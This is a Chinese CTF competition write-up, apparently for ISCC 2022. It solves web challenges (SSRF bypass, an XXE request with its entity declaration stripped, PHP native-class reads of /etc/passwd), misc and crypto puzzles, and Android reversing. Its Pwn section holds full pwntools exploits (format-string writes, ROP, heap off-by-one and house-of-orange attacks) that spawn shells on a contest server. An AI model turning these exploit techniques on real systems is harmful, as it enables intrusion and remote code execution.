0x01 Web
========

web3 爱国敬业好青年-2
--------------

这个首先是看源码

![1png.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-aaa3ddfeaf6d1e5932a1da070f944b113a267201.png)

关注这几个点

察觉到change返回open，flag返回方法错误，所以这里可能首先要交change，open之后再去flag。

坐标是北京天安门的坐标，纯猜测。就过了。

这是一道代码审计题
---------

参考链接

[Werkzeug更新带来的Flask debug pin码生成方式改变 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/network/238485.html)

**目前思路为通过文件包含读取关键文件，计算PIN码，实现命令执行**

![2.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-3aa86d1773e8dbacd50b70b59fc01ce5354ed4a2.png)

**将cookie从0改成1，出现参数提示**

![3.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-e642c164ce9ae45c1850be1a939f00f9cf8ba0be.png)

**发现url格式不对，找到加密文件**

![4.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-d6c93fb3fa21212498a810c1955f25b36fe4fc04.png)

为base100加密，在线加密得到源码

```php
def geneSign():
    if(control_key==1):
        return render_template("index.html")
    else:
        return "You have not access to this page!"

def check_ssrf(url):
    hostname = urlparse(url).hostname
    try:
        if not re.match('https?://(?:[-\w.]|(?:%[\da-fA-F]{2}))+', url):
            if not re.match('https?://@(?:[-\w.]|(?:%[\da-fA-F]{2}))+', url):
                raise BaseException("url format error")
        if  re.match('https?://@(?:[-\w.]|(?:%[\da-fA-F]{2}))+', url):
            if judge_ip(hostname):
                return True
            return False, "You not get the right clue!"
        else:
            ip_address = socket.getaddrinfo(hostname,'http')[0][4][0]
            if is_inner_ipaddress(ip_address):
                return False,"inner ip address attack"
            else:
                return False, "You not get the right clue!"
    except BaseException as e:
        return False, str(e)
    except:
        return False, "unknow error"

def ip2long(ip_addr):
    return struct.unpack("!L", socket.inet_aton(ip_addr))[0]

def is_inner_ipaddress(ip):
    ip = ip2long(ip)
    print(ip)
    return ip2long('127.0.0.0') >> 24 == ip >> 24 or ip2long('10.0.0.0') >> 24 == ip >> 24 or ip2long('172.16.0.0') >> 20 == ip >> 20 or ip2long('192.168.0.0') >> 16 == ip >> 16 or ip2long('0.0.0.0') >> 24 == ip >> 24

def waf1(ip):
    forbidden_list = [ '.', '0', '1', '2', '7']
    for word in forbidden_list:
        if ip and word:
            if word in ip.lower():
                return True
    return False

def judge_ip(ip):
    if(waf1(ip)):
        return Fasle
    else:
        addr = addr.encode(encoding = "utf-8")
        ipp = base64.encodestring(addr)
        ipp = ipp.strip().lower().decode()
        if(ip==ipp):
            global control_key
            control_key = 1
            return True
        else:

            return False
```

构造127.0.0.1的base64

```php
/index?url=http://@mti3ljaumc4x
```

根据hint换cookie和路由，找到登录界面，发现存在xxe漏洞。

```php
POST /mti3ljaumc4x/codelogin HTTP/1.1
Host: 59.110.159.206:8040
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/xml
Content-Length: 178
Origin: http://59.110.159.206:8040
Connection: close
Referer: http://59.110.159.206:8040/mti3ljaumc4x
Cookie: login=1; a_cookie=aW4gZmFjdCBjb29raWUgaXMgdXNlZnVsIQ==
Upgrade-Insecure-Requests: 1
<?xml version="1.0" encoding="utf-8" ?>

]>
<user>
<name>&file;</name>
<password>123</password>
</user>
```

Findme
------

![5.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-8d6631457265f17c81e4ffa517295213aa1a6d45.png)

本题为php原生类利用，我们可以选择原生类进行利用

DirectoryIterator 类提供了一个用于查看文件系统目录内容的简单接口。该类的构造方法将会创建一个指定目录的迭代器。

```php
<?php
$dir=new DirectoryIterator("/");
echo $dir;
```

SplFileObject 类为单个文件的信息提供了一个高级的面向对象的接口，可以用于对文件内容的遍历、查找、操作等。详情请参考：

```php
<?php
$context = new SplFileObject('/etc/passwd');
echo $context;
```

![6.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-443e8b8ab3cdf1660798084cd294f4d21c1765bd.png)  
思路为：先通过目录迭代器查找flag文件，然后通过 SplFileObject读取

0x02 Misc
=========

ISCC2022-星空1
------------

有个psd，用ps打开之后可以看见有俩个图层，这里就保存为png格式

![7.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-31a6b415bb06c24da745f4f9004c5ab8be046553.png)

可以得到一个顺序 13524

结合给出的poem.txt,可以猜测压缩包的密钥就是按这个序列的行进行拼接

解压得到一个对照关系

![8.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-f108b91e562a1cf016c4418aa7fb09d62b2663ce.png)

这里就再逆回去就是flag，后面的部分是为下题做的。

ISCC2022-星空2
------------

这是一道脑洞题，题目下载下来只有一个txt文档，内容和星空一一样都是符号：

![9.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-f7b049bdefe455f0303a0d46f0721ae22a7646b2.png)

提示是“漫天的繁星也许是另一首美丽的诗！”。首先按照六个符号一组进行分类，发现规律，尝试翻译对应UTF-8编码，没有结果，发现第三行和第四行一致，怀疑是字符‘CC’，解出部分字符：

![10.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-cd6c75438741827f7e42d9b8fbd31052c511a832.png)  
结合星空一中的列表文件，发现对应数字是该字符编码的最后一位，解出flag。

![11.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-a7052ad57d0c8cc9494ecab08df11f9bb6ae4c3d.png)

隐秘的信息
-----

用题目给的base64编码解码后解密压缩包得到一张图片

![12.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-1f78424ddd91e02ee4ea9b2334c35144e5f824c5.png)

然后使用Stegsolve可以发现有隐写信息

![13.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-3bc2b2d33a0908f0f452e3daa14c1a1d172cec3c.png)

复制这一段进行处理

![14.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-0aab5c6b9443ef4764c3a783287e51b721fa5bf0.png)

from hex to binary

再from binary

二进制去掉前三位

![15.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-859bcd53c39161263a23d2151da6b0424f0c5416.png)  
网站：[https://gchq.github.io/CyberChef/#recipe=From\\\_Hex('Auto')To\\\_Binary('Space',8)&amp;input=ZTkyYTY4Njg2ZjZkYzY4ODhjOGEyZThlYWE2YTJjODhhYjJjZTcwOGVlZTZhYWVlMGEyZmJmZmMwMWY4MDA3ZmZmZmM3ZTNmZTAwZmZmMDA3MQ](https://gchq.github.io/CyberChef/#recipe=From%5C_Hex('Auto')To%5C_Binary('Space',8)&input=ZTkyYTY4Njg2ZjZkYzY4ODhjOGEyZThlYWE2YTJjODhhYjJjZTcwOGVlZTZhYWVlMGEyZmJmZmMwMWY4MDA3ZmZmZmM3ZTNmZTAwZmZmMDA3MQ)

套中套
---

密码隐藏在那张图片里，补全png格式再修改高可以获的一部分，用winhex打开，最后有一段base64

主要看看密码部分，终于专业对口了

```php
import random
import codecs
import gmpy2
import sys
import os

def getRandom(randomlength=4):
        digits="0123456789"
        ascii_letters="abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
        str_list =[random.choice(digits +ascii_letters) for i in range(randomlength)]
        random_str =''.join(str_list)
        return random_str

def makeKey(n):
        privKey = [random.randint(1, 4**n)]
        s = privKey[0]
        for i in range(1, n):
                privKey.append(random.randint(s + 1, 4**(n + i)))
                s += privKey[i]
        q = random.randint(privKey[n-1] + 1, 2*privKey[n-1])
        r = random.randint(1, q)
        while gmpy2.gcd(r, q) != 1:
                r = random.randint(1, q)
        pubKey = [ r*w % q for w in privKey ]
        return privKey, q, r, pubKey

def encrypt(msg, pubKey):
        msg_bit = msg
        n = len(pubKey)
        cipher = 0
        i = 0
        for bit in msg_bit:
                cipher += int(bit)*pubKey[i]
                i += 1
        return bin(cipher)[2:]

flaggg=open('ffalg.txt','w')

# secret = input('Plz input the FLAG to generate the question.')
for i in range(50):
        fe = open('enc.txt', 'w')
        fpub = open('pub.Key', 'w')
        fpriv = open('priv.Key', 'w')
        fq = open('q.txt', 'w')
        fr = open('r.txt', 'w')

        print(i)
        tt="ISCC{"
        for j in range(3):
                temp=getRandom()
                tt=tt+temp+'-'
        secret = tt[:-1]+'}'
        flaggg.write(secret)
        flaggg.write('\n')
        msg_bit = bin(int(codecs.encode(secret.encode(), 'hex'), 16))[2:]
        keyPair = makeKey(len(msg_bit))
        pub_str = '['+', '.join([str(i) for i in keyPair[3]]) + ']'
        fpub.write(pub_str)
        #print ('pub.Key: ' + pub_str)
        enc =  encrypt(msg_bit, keyPair[3])
        #print ('enc: ' + str(int(enc, 2)))
        fe.write(str(int(enc, 2)))
        priv_str = '['+', '.join([str(i) for i in keyPair[0]]) + ']'
        #print ('priv.Key: ' + priv_str)
        fpriv.write(priv_str)
        #print('q: ' + str(keyPair[1]))
        fq.write(str(keyPair[1]))
        #print('r: ' + str(keyPair[2]))
        fr.write(str(keyPair[2]))
        name="misc-example-"+str(i+1)+".zip"
        fe.close()
        fpub.close()
        fpriv.close()
        fq.close()
        fr.close()

        os.system("zip -r -P'wELC0m3_T0_tH3_ISCC_Zo2z' tzt2.zip enc.txt generator.py priv.Key pub.Key q.txt r.txt")
        os.system("zip -r ./output/{}.zip tzt.png tzt2.zip".format(name))

flaggg.close()
```

先看加密部分

```php
def encrypt(msg, pubKey):
        msg_bit = msg
        n = len(pubKey)
        cipher = 0
        i = 0
        for bit in msg_bit:
                cipher += int(bit)*pubKey[i]
                i += 1
        return bin(cipher)[2:]

```

这里就可以知道cipher就是选择若干个pubKey相加，而选择哪一方相加是由明文决定

如果但从这里看，可以尝试暴力说不定可以，不过很明显不靠谱

然后可以再看看密钥的生成

```php
def makeKey(n):
        privKey = [random.randint(1, 4**n)]
        s = privKey[0]
        for i in range(1, n):
                privKey.append(random.randint(s + 1, 4**(n + i)))
                s += privKey[i]
        q = random.randint(privKey[n-1] + 1, 2*privKey[n-1])
        r = random.randint(1, q)
        while gmpy2.gcd(r, q) != 1:
                r = random.randint(1, q)
        pubKey = [ r*w % q for w in privKey ]
        return privKey, q, r, pubKey
```

这里有很多的信息

首先是公钥生成方式是r\*w %q

私钥是递增的并且大于之前私钥数之和

q大于最后一个私钥

首先可以先乘上逆元r，将cipher转换为在q上的私钥运算

考虑到这里q大于所有私钥之和，私钥是递增的，大于之前私钥之和。

所以很明显 ，对于任意的prikey\_i,如果加入cipher，

它的地位是唯一的，也就是加上它 cipher &gt; prikey\_i 不加上它 cipher &lt; prikey\_i（从最大的prikey开始判断）

可以写出最一般的情况解

```php
for i in range(1):
    r = 
    enc = 
    q = 
    #enc =  encrypt(msg_bit, keyPair[3],keyPair[0],q)
    key = 
    enc = (enc*gmpy2.invert(r,q))%q
    flag = ''
    for i in range(len(key)-1,-1,-1):
        if enc - key[i] > 0:
            enc -= key[i]
            flag =flag+'1'
        else:
            flag+='0'
    print(long_to_bytes(int(str(flag[::-1]),2)))
```

还有考虑一种特殊情况，就是之前的私钥值加上最后一个私钥值大于q的情况

此时需要先减去最后一个私钥值（mod q）,之后同上

```php
for i in range(1):
    r = 
    enc = 
    q = 
    #enc =  encrypt(msg_bit, keyPair[3],keyPair[0],q)
    key = 
    enc = (enc*gmpy2.invert(r,q))%q
    flag = ''
    enc = (enc-key[-1])%q
    flag+='1'
    for i in range(len(key)-2,-1,-1):
        if enc - key[i] > 0:
            enc -= key[i]
            flag =flag+'1'
        else:
            flag+='0'
    print(long_to_bytes(int(str(flag[::-1]),2)))
```

0x03 Pwn
========

pwn1 create\_id
---------------

简单的格式化字符串

```php
from pwn import *

p = remote("123.57.69.203","5310")

addr = int(p.recv(len("0xffefb738")),16)
p.recvuntil('You will get the user id after you finish it.\n')
p.sendline('1')
p.sendlineafter('incorrect','1')
p.sendlineafter('incorrect','1')

p.recvuntil("What's your name?")
payload = p32(addr)+'aaaaa'+"%10$hhn"
p.sendline(payload)

p.interactive()
```

pwn2 sim\_treasure
------------------

也是简单的格式化字符串

```php
from pwn import *

context.log_level = 'debug'
context.arch='x86'
# p = process('sp1')
p = remote("123.57.69.203","7010")

libc = ELF('libc-2.27.so')

#leak
payload = '%35$p'
p.recvuntil('Can you find the magic word?\n')

p.sendline(payload)

addr = int(p.recv(len("0xf7dd6ee5")),16)

offset = libc.sym['__libc_start_main']
libc_base = addr - 245 - offset

print "[-]libc_base=>" + hex(libc_base)

one = libc_base + 0x3d200
print hex(one)

payload = fmtstr_payload(6, {0x08049A60:one})

sleep(0.5)
p.sendline(payload)

sleep(0.5)

p.sendline('/bin/sh\x00')
p.interactive()
```

pwn3 跳一跳
--------

一个栈溢出，要点在scnaf的for循环怎么跳出来，然后泄露libc

```php
#coding:utf-8
from pwn import *
# p=process('./attachment-10')
p=remote("123.57.69.203",7020)
# context.log_level = 'debug'
p.recvuntil('Hello CTFer! Welcome to the world of pwn~\n')
elf=ELF('./attachment-10')
# libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
# libc=ELF('./libc-2.27.so')
#第一次main
for i in range(216):
    p.sendline(b'123')
p.sendline(b'65')

p.send(b'c')
p.recvuntil(b'A')
result=p.recv()
canary=u64(result[:7].ljust(8,b'\x00'))*16*16
ebp=u64(result[7:13].ljust(8,b'\x00'))
print(hex(ebp))

print(hex(canary))
p.send(b'0'*(0xe0-8)+p64(canary)+b'c'*8+p8(0x98))
#第二次main

for i in range(231):
    p.sendline(b'123')
p.sendline(b'65')
p.recvuntil(b'A')

main=u64(p.recv(6).ljust(8,b'\x00'))-24
elf_base=main-0x128F
init=elf_base+0x1298
put_got=elf_base+elf.got['puts']
put_plt=elf_base+elf.plt['puts']
pop_rdi=elf_base+0x130b
leave=elf_base+0x124A
ret=elf_base+0x1016

init_1=elf_base+0x1250
fun=elf_base+0x1185

print(hex(put_plt))

payload=b'/bin/sh\x00'+p64(pop_rdi)+p64(put_got)+p64(put_plt)+p64(main)
p.send(payload.ljust(0xe0-8,b'\x00')+p64(canary)+p64(ebp-0xf0)+p64(leave))

#获取libc
puts_addr=u64(p.recv(6).ljust(8,b'\x00'))
print(hex(puts_addr))
base = puts_addr - 0x0809c0
system=base+0x04f440

# #第三次main

for i in range(231):
    p.sendline(b'123')
# gdb.attach(p)
p.sendline(b'65')
p.recvuntil(b'A')
payload=p64(ret)+p64(ret)+p64(pop_rdi)+p64(ebp-0xd0)+p64(system)
p.send(payload.ljust(0xe0-8,b'\x00')+p64(canary)+p64(ebp-0xf0-0xd8)+p64(leave))

p.interactive()
```

pwn4 Huge\_Space
----------------

这个题和h-o-s都挺有意思的。流程非常简单。

上来先给一个溢出。

由于没有free函数，考虑到leak应该是使用orange那样的方法。而该函数存在canary，想要通过rop拿到shell，又要考虑到canary的限制，而此处没有限制malloc的大小，则采用覆盖tls的方法，控制canary，总的来说还是house\_of\_orange + force的利用。

```php
from pwn import * 
context.log_level = 'debug'
p = remote('123.57.69.203',5330 )

libc = ELF('./libc.so.6')
elf = ELF('./Huge_Space')

ru = lambda a,b=True : io.recvuntil(a,b)
sd = lambda x : p.send(x)
sl = lambda x : p.sendline(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)
it = lambda : p.interactive()
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
def leak(offset):
        addr = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
        base = addr - offset
        return base
def add(idx,size,content):
    sl('+++') 
    sla('Index:',str(idx)) 
    sla('Size: ',str(size))
    sla('Data: ',content)
def show(idx,size):
    sl('print') 
    sla('Index:',str(idx)) 
    sla('Size: ',str(size))

pop_rdi = 0x0000000000400be3
pop_rsi_r15 = 0x0000000000400be1
pop_rdx = 0x0000000000001b96
pop_rbp = 0x0000000000400860
leave_ret = 0x40090F
sh = 0x400909
writee = 0x400B19

sl('\x00'*0x48+p64(pop_rbp)+p64(0x6010c0+0x10)+p64(leave_ret))
add(0,0x10,'A'*0x10+p64(0)+p64(0xd81)) #0
add(1,0x1000,'B')#1
add(1,0xd50,'')#1

show(1,0x20)
libcbase = leak(0) - 0x3ebc00
lg('libcbase')
execve = libcbase + libc.symbols['execve'] 
lg('execve')

add(3,0x22000,'\x00'*(0x24518+16*8)+'\x00'*8)#3
sl('exit\x00\x00\x00\x00/bin\x00'+p64(pop_rdi)*2+p64(0x6010c0+8)+ p64(pop_rsi_r15)+p64(0)*2+p64(pop_rdx+libcbase)+p64(0)+p64(execve))
it()
```

pwn5 untidy\_note
-----------------

是个off\_by\_one，也挺简单的

```php
#coding=utf-8
from pwn import *

context(arch="amd64", os="linux")
context.log_level='debug'
# context.terminal=['tmux','splitw','-h']

ip = '123.57.69.203'
port = '7030'
reomote_addr = [ip,port]
binary = './untidy_note'

libc = ELF('./2.27-3ubuntu1.4_amd64/libc.so.6')
elf = ELF(binary)
if len(sys.argv)==1:
    p = process(binary)

if len(sys.argv)==2 :
    p = remote(reomote_addr[0],reomote_addr[1])

#----------------------------------------------------------------------
ru = lambda x : p.recvuntil(x,timeout=0.2)
sd = lambda x : p.send(x)
rl = lambda   : p.recvline()
sl = lambda x : p.sendline(x)
rv = lambda x : p.recv(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)
it = lambda :p.interactive()
ru7f = lambda : u64(ru('\x7f')[-6:].ljust(8,b'\x00'))
rv6 = lambda : u64(rv(6)+b'\x00'*2)
lg = lambda s: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
bp = lambda src=None : attach(p,src)
sym = lambda name : libc.sym[name]
#----------------------------------------------------------------------

def leak(offset):
        addr = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
        base = addr - offset
        print "[+]libc_base=>"+hex(base)
        return base

def menu(idx):
    sla("Your choose is:\n",str(idx))

def add(size):
    menu(1)
    ru("the note size is:\n")
    sl(str(size))

def free(index):
    menu(2)
    ru("index:\n\n")
    sl(str(index))

def edit(index,size,content):
    menu(3)
    ru("index:\n")
    sl(str(index))
    ru("the size is:\n")
    sl(str(size))
    ru("Content:\n")
    sl(content)

def show(index):
    menu(4)
    ru("index:\n")
    sl(str(index))

# attach(p)#,'b *$rebase(0x0000000000000A8B)')
sla("Your name is:",str("Epiphany"))
#--leak
add(0x10)
for j in range(25):
    add(0x20-1)

add(0x10) #26
payload =  'a'*0x10+p64(0)+p64(0x4b1)
edit(0,len(payload),payload)
free(1)

show(1)
offset = libc.sym['__malloc_hook'] +0x10 + 96
libc_base = leak(offset)

free_hook = libc.sym['__free_hook'] + libc_base
system = libc.sym['system'] + libc_base

free(26)
# free(3)
#num = 27
payload = p64(free_hook)
edit(26,len(payload),payload)

add(0x10) #25
pause()
add(0x10) #26
payload = p64(system)
edit(26,len(payload),payload) 
pause()
edit(9,len('/bin/sh\x00'),"/bin/sh\x00")
pause()
free(9)
it()
```

pwn6 unlink
-----------

一开始我还以为是一个纯纯的unlink，后来发现溢出就完事了。(我还傻傻的去问libc）

```php
from pwn import *

context.log_level = 'debug'
# p = remote('123.57.69.203',5810)
p = process('./attachment-38')
#----------------------------------------------------------------------
ru = lambda x : p.recvuntil(x,timeout=0.2)
sd = lambda x : p.send(x)
rl = lambda   : p.recvline()
sl = lambda x : p.sendline(x)
rv = lambda x : p.recv(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)
it = lambda :p.interactive()
ru7f = lambda : u64(ru('\x7f')[-6:].ljust(8,b'\x00'))
rv6 = lambda : u64(rv(6)+b'\x00'*2)
lg = lambda s: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
bp = lambda src=None : attach(p,src)
sym = lambda name : libc.sym[name]
#----------------------------------------------------------------------

def add(idx, size, data):
    sl("add")
    ru("Index:")
    sl(str(idx))
    ru("Size:")
    sl(str(size))
    ru("Data:")
    sl(data)

def dele(idx):
    sl("remove")
    ru("Index:")
    sl(str(idx))

# attach(p)
add(0, 0x40, '')
add(1, 0x80, '')
add(2, 0x80, '')
add(3,0x20,'/bin/sh\x00')
add(4, 0x20, 'protect')

dele(0)
dele(2)
dele(1)

add(0, 0x40, 'a' * 0x40 + p64(0) + p64(0x91) + p64(0x601018))

add(1, 0x80, p64(0x6001030))

add(1, 0x80, p64(0x6001030)+p64(0x000000000400896))

sl('/bin/sh')
# dele(3)
it()
```

Pwn7 heapheap
-------------

也是个off\_by\_one，当时眼瞎，没看见。。。

```php
#coding=utf-8
from pwn import *

context(arch="amd64", os="linux")
# context.log_level='debug'
# context.terminal=['tmux','splitw','-h']

# ip = ''
# port = ''
# reomote_addr = [ip,port]
# binary = './heapheap'

# libc = ELF('/home/tamako/Desktop/tools/glibc-all-in-one/libs/2.27-3ubuntu1.4_amd64/libc.so.6')
# elf = ELF(binary)
# if len(sys.argv)==1:
#     p = process(binary)

# if len(sys.argv)==2 :
#     p = remote(reomote_addr[0],reomote_addr[1])

#----------------------------------------------------------------------
ru = lambda x : p.recvuntil(x,timeout=0.2)
sd = lambda x : p.send(x)
rl = lambda   : p.recvline()
sl = lambda x : p.sendline(x)
rv = lambda x : p.recv(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)
it = lambda :p.interactive()
ru7f = lambda : u64(ru('\x7f')[-6:].ljust(8,b'\x00'))
rv6 = lambda : u64(rv(6)+b'\x00'*2)
lg = lambda s: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
bp = lambda src=None : attach(p,src)
sym = lambda name : libc.sym[name]
#----------------------------------------------------------------------

def leak(offset):
        addr = u64(p.recvuntil('\x7f',timeout=2)[-6:].ljust(8,'\x00'))
        base = addr - offset
        print "[+]libc_base=>"+hex(base)
        return base

def menu(idx):
        ru('Please input your choice: ')
        sl(str(idx))

def add(size,content='a'):
        menu(1)
        ru('Please input the size:')
        sl(str(size))
        ru('Data:')
        sd(content)

def fulladd(size,content):
        menu(1)
        ru('Please input the size:')
        sl(str(size))
        ru('Data:')
        sd(content)

def free(idx):
        menu(2)
        ru('Please input the index:')
        sl(str(idx))

#---------------------------------------------overlap
# attach(p)
def exp():
        add(0x4f8,'first') #0 
        add(0xf8,'b') #1
        add(0xf8,'c') #2
        add(0xf8,'d') #3

        free(2)
        payload = 'a'*0xf0 + p64(0x500+0x100+0x100)
        add(0xf8,payload)

        for i in range(4,10):
                add(0xf8,'a')

        for i in range(4,10):
                free(i)

        free(1)

        free(0)
        free(3)
        #---------------------------------------------fd-->stdout leak
        add(0x4f8,'Epiphany') #0
        add(0x20,p16(0xe760)) #1

        add(0xf8,'junk') #3
        payload = p64(0xfbad1800) + p64(0) * 3 + '\x00'
        add(0xf8, payload) #4
        libc_base = leak(0x3ed8b0) # _IO_stdfile_2_lock

        # lg("libc_base")

        free_hook = libc_base + libc.sym['__free_hook']
        malloc_hook = libc_base + libc.sym['__malloc_hook']
        system = libc_base + libc.sym['system']
        og = libc_base + 0x4f432
        #---------------------------------------------fd->hook->shell
        free(2)
        payload = 'a'*0xc8 + p64(0x101) + p64(free_hook)
        add(0x120,payload) #2

        add(0xf8,'junk') #5
        add(0xf8,p64(og)) #6

        free(0)

# exp()
# it()
libc = ELF('./libs/2.27-3ubuntu1.4_amd64/libc.so.6')
ids = 0
while(1):
        try:
                print "try %d times"%ids
                p = remote("123.57.69.203",5320)
                # p = process('./heapheap')
                exp()
                # p.sendline("cat flag.txt")
                p.interactive()
                break
        except:
                ids+=1
                p.close()
```

0x04 Mobile
===========

mobile1
-------

简单的一道题，一个打乱hash加密，写脚本还原顺序，通过在线md5就可以解出来，这是一部分，第一部分是一个AES加密，密钥偏移已知（都需要base加密一次），直接解就行了，需要注意的是参与的密文需要线base64解一次

顺序还原

```php
s = '=HlVsHP=gtzu2maJaJNX7fOc'
print(len(s))
a = list('012345678901234567890123')
z = False
k = 0
for i in range(5, -1, -1):
    if not z:
        for j in range(3, -1, -1):
            a[j * 6 + i] = s[k]
            k += 1
        z = True
    else:
        for l in range(0, 4):
            a[l * 6 + i] = s[k]
            k += 1
        z = False
for i in range(len(a)):
    print(a[i],end='')
```

aes解密，网上套的脚本

```php
from Crypto.Cipher import AES
from binascii import b2a_hex, a2b_hex
import hashlib
import base64

#例子如下
#明文:str(binascii.b2a_hex(str.encode('tuya49368a48b746')))[2:-1]
#密文:51506024af73925e15da8873afb08f9d
#key:str(binascii.b2a_hex(str.encode('8sHRRhqNAdXnSvpA')))[2:-1]
#iv:str(binascii.b2a_hex(str.encode('8sHRRhqNAdXnSvpA')))[2:-1]

#如果text不足16位的倍数就用"00"补足,即采用NoPadding方式补齐
def PKCS_zero(text):
    newbytes = '00'
    if len(text) % 32:
        add = 32 - (len(text) % 32)
        add = add >> 1
    else:
        add = 0
    text = text + newbytes * add
    return text

# 加密函数
def AES_CBC_encrypt(text,key,iv):
    print("AES_CBC_encrypt")
    print(" key  :", key, type(key))
    print(" iv   :", iv, type(iv))
    print("plain :", text, type(text))

    mode = AES.MODE_CBC
    text = PKCS_zero(text)
    text = bytes.fromhex(text)
    print("plain :", bytes.hex(text),type(text))
    key = bytes.fromhex(key)
    iv = bytes.fromhex(iv)

    cryptos = AES.new(key, mode, iv)
    cipher_text = bytes.hex(cryptos.encrypt(text))
    # 因为AES加密后的字符串不一定是ascii字符集的，输出保存可能存在问题，所以这里转为16进制字符串

    print("cipher:", cipher_text, type(cipher_text))
    print("************************************************")
    return cipher_text
    # 解密后，去掉补足的空格用strip() 去掉

#AES-CBC解密
def AES_CBC_decrypt(text,key,iv):
    print("AES_CBC_decrypt")
    print(" key  :", key, type(key))
    print(" iv   :", iv, type(iv))
    print("plain :", text, type(text))

    mode = AES.MODE_CBC
    cryptos = AES.new(key, mode, iv)

    plain_text = bytes.hex(cryptos.decrypt(text))

    print("cipher:", plain_text, type(plain_text))
    print("************************************************")

    return plain_text
k = AES_CBC_decrypt(base64.b64decode(b"QeCMiDUoS/PkX6a0ISs/cUeBsCz6/4V/tefaYnECMBI="),'S0BlMjAyMiUleQ==',b'SSZWMjAyMioqKg==')
k = k[:34]
from Crypto.Util.number import *
print(long_to_bytes(int(k,16)))
```

mobile3
-------

一个简单的aes，需要动态调试出密钥，方法网上有很多。

调试出来之后，观察密文，不是标准的aes形式。

然后再看源码，发现还有so里面的一个函数getstr需要逆向一下，进去一看，啧，标准的栅栏。

但是问题就在于，这个分组之后的顺序不对。

```php
o4O6+uY=
/gmnBpL=
CKa+pm3=
Tug9B9p=
2McS3PT=
WAVDhTIQ
```

\\=是分组位数不足补上的，那么第一组就不会有缺陷，所以第六行才是第一组，

按照这种逻辑推理，需要对剩下的进行排列组合，推算出所有可能性，一共24中可能，爆破之后，使用aes揭秘即可。

提供解密脚本如下

```php
def jie(a,e):
    for i in range(1,6):
        for j in range(1,6):
            for k in range(1,6):
                for l in range(1,6):
                    for m in range(1,6):
                        b={0,i,j,k,l,m}
                        c=[0,i,j,k,l,m]
                        if len(b)!=6:
                            continue
                        d=""
                        for n in range(8):
                            for o in c:
                                d+=a[o][n]
                        cipher=AES.new(b'QERAPG9dPyZfTC5f',AES.MODE_CBC,b'aUBTJjg4Q2NDLg==')
                        plaintext=cipher.decrypt(base64.b64decode(d))
                        s=""
                        for p in range(1,6):
                            if p!=e:
                                s+=str(c.index(p)+1)
                            else:
                                s+=str(c.index(p)+1)
                                s+="1"
                        if len(s)!=6:
                            s="1"+s
                        if s.encode() in plaintext:
                            print(unpad(plaintext))
```